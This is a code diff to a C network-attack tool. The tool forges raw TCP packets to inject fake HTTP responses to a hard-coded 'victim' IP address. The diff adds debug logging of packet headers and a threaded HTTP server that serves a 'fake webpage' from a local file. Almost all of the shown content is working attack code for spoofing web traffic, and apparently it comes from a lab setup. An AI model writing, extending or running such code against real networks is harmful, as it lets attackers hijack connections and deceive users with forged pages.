@@ -8,6 +8,8 @@
 #include <errno.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <stdarg.h>
+#include <pthread.h>
 
 #define PORT 9090
 #define BUFFER_SIZE 1024
@@ -16,6 +18,7 @@
 #define VICTIM_IP "172.20.0.102"
 #define INDEX_HTML_PATH "./index.html"
 #define MAX_HTML_SIZE 4096
+#define HTTP_PORT 80
 
 // HTTP response template
 #define FAKE_RESPONSE "HTTP/1.1 200 OK\r\n" \
@@ -49,7 +52,23 @@ void error(const char *msg) {
     exit(1);
 }
 
+void debug_log(const char *format, ...) {
+    va_list args;
+    va_start(args, format);
+    time_t now = time(NULL);
+    char timestamp[64];
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
+    printf("[DEBUG %s] ", timestamp);
+    vprintf(format, args);
+    printf("\n");
+    fflush(stdout);
+    va_end(args);
+}
+
 void send_fake_response(const char *response, const char *victim_ip, int victim_port) {
+    debug_log("Preparing fake response to %s:%d", victim_ip, victim_port);
+    debug_log("Response content length: %lu bytes", strlen(response));
+    
     // Tell kernel we're including our own headers
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
@@ -103,9 +122,17 @@ void send_fake_response(const char *response, const char *victim_ip, int victim_
     // Copy response data
     memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), response, strlen(response));
     
+    // Log packet details before sending
+    debug_log("Sending IP packet: ver=%d, ihl=%d, len=%d", 
+              ip->version, ip->ihl, ntohs(ip->tot_len));
+    debug_log("TCP header: sport=%d, dport=%d, flags=0x%x", 
+              ntohs(tcp->th_sport), ntohs(tcp->th_dport), tcp->th_flags);
+    
     // Send packet
     if (sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
-        perror("sendto failed");
+        debug_log("Failed to send packet: %s", strerror(errno));
+    } else {
+        debug_log("Packet sent successfully");
     }
     close(sock);
 }
@@ -154,7 +181,86 @@ void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, s
            (struct sockaddr *)clientaddr, len);
 }
 
+// Add TCP server thread function
+void *handle_http_server(void *arg) {
+    int server_fd;
+    struct sockaddr_in address;
+    
+    // Create TCP socket
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
+        perror("HTTP socket failed");
+        return NULL;
+    }
+    
+    // Enable socket reuse
+    int opt = 1;
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
+        perror("setsockopt");
+        return NULL;
+    }
+    
+    // Bind to specific IP instead of INADDR_ANY
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST); // Bind to server IP
+    address.sin_port = htons(HTTP_PORT);
+    
+    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
+        perror("HTTP bind failed");
+        return NULL;
+    }
+    
+    if (listen(server_fd, 10) < 0) {
+        perror("HTTP listen");
+        return NULL;
+    }
+
+    printf("[+] HTTP server listening on %s:%d\n", LOCAL_SERVER_HOST, HTTP_PORT);
+    
+    while(1) {
+        int addrlen = sizeof(address);
+        int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
+        if (new_socket < 0) {
+            perror("accept");
+            continue;
+        }
+
+        // Read the HTTP request
+        char request[1024] = {0};
+        read(new_socket, request, sizeof(request));
+        printf("[+] Received HTTP request:\n%s\n", request);
+
+        // Send fake response
+        char *html_content = read_html_file();
+        if (html_content) {
+            char response[MAX_HTML_SIZE + 512];
+            snprintf(response, sizeof(response),
+                    "HTTP/1.1 200 OK\r\n"
+                    "Server: FakeServer\r\n"
+                    "Content-Type: text/html\r\n"
+                    "Content-Length: %lu\r\n"
+                    "Connection: close\r\n"
+                    "\r\n"
+                    "%s",
+                    strlen(html_content), html_content);
+
+            write(new_socket, response, strlen(response));
+            printf("[+] Sent fake webpage\n");
+        }
+        
+        close(new_socket);
+    }
+    
+    return NULL;
+}
+
 int main() {
+    // Add thread for HTTP server
+    pthread_t http_thread;
+    if (pthread_create(&http_thread, NULL, handle_http_server, NULL) != 0) {
+        perror("Failed to create HTTP server thread");
+        exit(1);
+    }
+
     int sockfd;
     struct sockaddr_in servaddr, clientaddr, forwardaddr;
     char buffer[BUFFER_SIZE];
